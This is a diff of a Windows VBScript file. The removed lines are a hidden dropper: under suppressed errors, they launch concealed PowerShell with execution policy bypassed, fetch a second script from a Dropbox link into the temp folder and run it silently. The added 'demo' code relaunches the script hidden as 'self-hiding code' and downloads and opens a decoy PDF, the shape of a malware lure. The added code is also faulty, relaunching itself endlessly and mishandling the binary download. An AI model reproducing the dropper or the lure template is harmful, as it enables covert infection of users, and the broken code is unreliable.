@@ -1,7 +1,30 @@
-On Error Resume Next
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
-    """Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/zml5yox7saix5i6ivmblt/runscript.vbs?rlkey=g2ogfbm6uwl7a1pa2vxhluwni&st=nw56htuz&dl=1' " & _
-    "-OutFile ($env:TEMP + '\\runscript.vbs'); " & _
-    "if (Test-Path ($env:TEMP + '\\runscript.vbs')) { " & _
-    "Start-Process -WindowStyle Hidden wscript.exe -ArgumentList '/B', ($env:TEMP + '\\runscript.vbs') }""", 0, False
+' Self-hiding code
+CreateObject("WScript.Shell").Run "cmd /c start " & WScript.ScriptFullName, 0, False
+
+' Download and display a legitimate PDF file as part of your demo
+Set http = CreateObject("MSXML2.XMLHTTP")
+Set shell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+' Replace with URL to your PDF file
+pdfUrl = "https://example.com/document.pdf" 
+tempFile = shell.ExpandEnvironmentStrings("%TEMP%") & "\document.pdf"
+
+' Download PDF
+http.open "GET", pdfUrl, False
+http.send
+If http.Status = 200 Then
+    Set stream = fso.CreateTextFile(tempFile, True)
+    stream.Write http.responseBody
+    stream.Close
+    
+    ' Open the PDF file
+    shell.Run """" & tempFile & """", 1, False
+End If
+
+' Add your additional demo code here
+' This is where you would put the non-harmful demonstration code
+
+' Self-terminate after short delay
+WScript.Sleep 1000
+WScript.Quit
